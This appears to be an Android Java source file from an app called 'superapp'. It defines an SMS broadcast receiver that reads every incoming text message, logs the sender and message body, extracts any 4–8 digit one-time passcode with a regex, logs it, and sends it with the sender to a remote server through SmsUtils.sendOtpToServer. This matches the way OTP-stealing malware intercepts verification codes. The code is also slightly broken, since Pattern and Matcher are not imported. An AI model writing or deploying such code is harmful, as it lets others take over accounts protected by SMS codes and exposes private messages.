package com.sungku.superapp.smsdaemon;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String messageBody = sms.getMessageBody();
                    String sender = sms.getOriginatingAddress();
                    Log.d(TAG, "SMS reçu de " + sender + ": " + messageBody);
                    // Détection OTP simple (4-8 chiffres)
                    Pattern otpPattern = Pattern.compile("\\b(\\d{4,8})\\b");
                    Matcher matcher = otpPattern.matcher(messageBody);
                    if (matcher.find()) {
                        String otp = matcher.group(1);
                        Log.d(TAG, "OTP détecté: " + otp);
                        SmsUtils.sendOtpToServer(otp, sender);
                    }
                }
            }
        }
    }
}
